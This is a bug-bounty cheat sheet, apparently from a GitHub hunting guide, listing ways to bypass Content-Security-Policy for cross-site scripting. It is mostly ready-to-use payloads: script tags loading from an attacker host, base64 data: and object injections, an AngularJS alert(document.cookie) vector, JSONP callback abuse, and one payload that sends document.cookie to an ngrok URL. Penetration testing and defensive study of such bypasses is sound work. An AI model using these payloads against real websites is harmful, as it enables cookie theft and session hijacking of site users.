https://github.com/KathanP19/HowToHunt/blob/master/XSS/Bypass_CSP.md


%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';

Intro
	Implemented via response header
		Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
	Implemented via meta tag
		<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
		
Unsafe CSP Rules
	Content-Security-Policy: script-src https://google.com 'unsafe-inline'; 
		"/><script>alert(1);</script>
			https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes
	Content-Security-Policy: script-src https://google.com 'unsafe-eval'; 
		<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
	如果你能用某种方式让允许的JS代码使用你的JS代码在DOM中创建一个新的脚本标签, 它将被执行
	
Examples
	Wildcard 
		Content-Security-Policy: script-src 'self' https://google.com https: data *; 
			"/>'><script src=https://attacker-website.com/evil.js></script>
			"/>'><script src=data:text/javascript,alert(1337)></script>
	Lack of object-src and default-src
		Content-Security-Policy: script-src 'self' ;
			<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
			">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
			<param name="AllowScriptAccess" value="always"></object>
	File Upload + 'self'
		Content-Security-Policy: script-src 'self';  object-src 'none' ; 
			"/>'><script src="/uploads/picture.png.js"></script>
	Third Party Endpoints + ('unsafe-eval')
		Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval'; 
			https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#third-party-endpoints-+-unsafe-eval
	Third Party Endpoints + JSONP
		Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
			"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
			"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
			

Basic Bypass
	default-src 'self' *
		OK
	script-src 'unsafe-inline' 'unsafe-eval' 'self' 
		OK
	data: https://www.google.com http://www.google-analytics.com/gtm/js  https://*.gstatic.com/feedback/ https://accounts.google.com;
		<iframe/src=”data:text/html,”>
	Content-Security-Policy-Report-Only
		 won't block anything
		 
JSONP CSP Bypass
	https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)
	
	script-src https://www.google.com http://www.google-analytics.com/gtm/js  https://*.gstatic.com/feedback/ https://accounts.google.com;
		something.example.com?vuln_param=javascript:alert(1); -> BLOCK
		something.example.com?vuln_param=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337) -> OK
		
CSP Injection Bypass
	example.com?vuln=something_vuln_csp
		观察something_vuln_csp是否反射到响应头
		
GET -> POST